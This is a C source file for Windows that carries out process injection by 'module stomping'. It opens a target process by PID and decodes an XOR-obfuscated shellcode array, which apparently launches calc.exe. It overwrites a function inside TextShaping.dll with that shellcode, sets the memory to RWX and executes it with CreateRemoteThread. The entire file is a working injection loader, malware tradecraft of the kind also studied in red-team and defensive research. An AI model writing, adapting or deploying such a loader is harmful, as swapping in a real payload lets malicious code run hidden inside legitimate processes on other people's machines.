#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

#define error(FUNCTIONNAME) printf("[-] %s Failed With Error : %d\n", #FUNCTIONNAME, GetLastError()) // function error
#define log(LOGTEXT) printf("[+] %s\n", #LOGTEXT)
#define generror(ERRTEXT) printf("[-] %s\n", #ERRTEXT) // general error

/* Basically, get process handle, find useless DLL it loads, overwrite one function, CreateRemoteThread at that point to execute payload */ 

unsigned char pPayload[] =
"\x85\x31\xfa\x9d\x89\x91\xb9\x79\x79\x79\x38\x28\x38\x29\x2b\x28\x2f\x31\x48\xab\x1c\x31\xf2\x2b\x19\x31\xf2\x2b\x61\x31\xf2\x2b\x59\x31\xf2\x0b\x29\x31\x76\xce\x33\x33\x34\x48\xb0\x31\x48\xb9\xd5\x45\x18\x05\x7b\x55\x59\x38\xb8\xb0\x74\x38\x78\xb8\x9b\x94\x2b\x38\x28\x31\xf2\x2b\x59\xf2\x3b\x45\x31\x78\xa9\xf2\xf9\xf1\x79\x79\x79\x31\xfc\xb9\x0d\x1e\x31\x78\xa9\x29\xf2\x31\x61\x3d\xf2\x39\x59\x30\x78\xa9\x9a\x2f\x31\x86\xb0\x38\xf2\x4d\xf1\x31\x78\xaf\x34\x48\xb0\x31\x48\xb9\xd5\x38\xb8\xb0\x74\x38\x78\xb8\x41\x99\x0c\x88\x35\x7a\x35\x5d\x71\x3c\x40\xa8\x0c\xa1\x21\x3d\xf2\x39\x5d\x30\x78\xa9\x1f\x38\xf2\x75\x31\x3d\xf2\x39\x65\x30\x78\xa9\x38\xf2\x7d\xf1\x31\x78\xa9\x38\x21\x38\x21\x27\x20\x23\x38\x21\x38\x20\x38\x23\x31\xfa\x95\x59\x38\x2b\x86\x99\x21\x38\x20\x23\x31\xf2\x6b\x90\x2e\x86\x86\x86\x24\x31\xc3\x78\x79\x79\x79\x79\x79\x79\x79\x31\xf4\xf4\x78\x78\x79\x79\x38\xc3\x48\xf2\x16\xfe\x86\xac\xc2\x89\xcc\xdb\x2f\x38\xc3\xdf\xec\xc4\xe4\x86\xac\x31\xfa\xbd\x51\x45\x7f\x05\x73\xf9\x82\x99\x0c\x7c\xc2\x3e\x6a\x0b\x16\x13\x79\x20\x38\xf0\xa3\x86\xac\x1a\x18\x15\x1a\x57\x1c\x01\x1c\x79";

BOOL GetProcessHandle(DWORD dwPID, HANDLE* hProcess) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    log(Snapshot taken!);

    if (!Process32First(hSnap, &pe32)) {
        error(Process32First);
        CloseHandle(hSnap);
        return FALSE;
    }

    log(Checked first process!);

    do {
        if (dwPID == pe32.th32ProcessID) {
            log(Found process!);
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            log(Opened handle);
            if (*hProcess == NULL) {
                error(OpenProcess);
                CloseHandle(hSnap);
                return FALSE;
            }
            break;
        }
    } while (Process32Next(hSnap, &pe32));

    if (hSnap != NULL) CloseHandle(hSnap);
    if (*hProcess == NULL) return FALSE;

    return TRUE;

}

int main(int argc, char* argv[]) {
    DWORD dwPID = atoi(argv[1]);
    if (argc < 2) {
        printf("Usage: .\\map.exe <PID>\n");
        return -1;
    }
    HANDLE hProcess = NULL;

    if (!GetProcessHandle(dwPID, &hProcess)) {
        generror(Failed to find process);
        return -1;
    }
    // Function that notepad.exe uses! Change as per requirement.
    HANDLE hModule = LoadLibraryA("TextShaping.dll");
    if (!hModule) {
        error(LoadLibraryA);
        return -1;
    }
    log(Loaded DLL);

    // Benign function to overwrite without consequences
    PVOID pFunction = GetProcAddress(hModule, "ShapingGetGlyphPositions");
    if (!pFunction) {
        error(GetProcAddress);
        return -1;
    }
    log(Found function);

    SIZE_T sPayloadSize = sizeof(pPayload);
    char key = 'key';
    int i = 0;
    for (i; i < sPayloadSize; i++) {
        pPayload[i] = pPayload[i] ^ key;
    }
    log(Decrypted shellcode);

    DWORD dwOld = NULL;
    SIZE_T sWrittenBytes = NULL;

    VirtualProtectEx(hProcess, pFunction, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOld);
    log(Allocated RWX space);

    WriteProcessMemory(hProcess, pFunction, pPayload, sPayloadSize, &sWrittenBytes);
    log(Wrote shellcode);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, pFunction, NULL, NULL, NULL);
    WaitForSingleObject(hThread, INFINITE);
    log(Started thread);
}